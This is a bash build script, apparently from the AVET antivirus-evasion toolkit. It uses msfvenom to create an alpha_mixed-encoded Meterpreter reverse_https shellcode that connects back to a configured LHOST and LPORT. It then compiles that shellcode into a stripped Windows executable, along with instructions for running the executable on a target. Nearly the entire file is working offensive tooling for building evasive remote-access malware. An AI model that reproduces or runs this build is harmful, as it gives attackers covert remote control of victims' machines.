#!/bin/bash          


#DESCRIPTION_START
# Call the generated output.exe on target, 
# delivering the shellcode string in output/alpha_mixed.txt as command line argument
#DESCRIPTION_END


# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh


#CONFIGURATION_START
# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
# no command preexec
set_command_source no_data
set_command_exec no_command
# enable debug output
enable_debug_print
#CONFIGURATION_END


# make meterpreter reverse payload, encoded with msf alpha_mixed 
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows -f raw > output/sc_alpha_mixed.txt

# set shellcode source
set_payload_source from_command_line_raw

# set decoder and key source
set_decoder none
set_key_source no_data

# set payload info source
set_payload_info_source no_data

# set shellcode binding technique
set_payload_execution_method exec_shellcode_ASCIIMSF

# compile to exe file
$win32_compiler -ffixed-eax -o output/asciimsf_fromcmd_revhttps_win32.exe source/avet.c
strip output/asciimsf_fromcmd_revhttps_win32.exe

# cleanup
cleanup_techniques


echo "
# Call the generated .exe on target delivering the shellcode string in output/sc_alpha_mixed.txt as command line argument:
# $ asciimsf_fromcmd_revhttps_win32.exe sc_alpha_mixed.txt
"
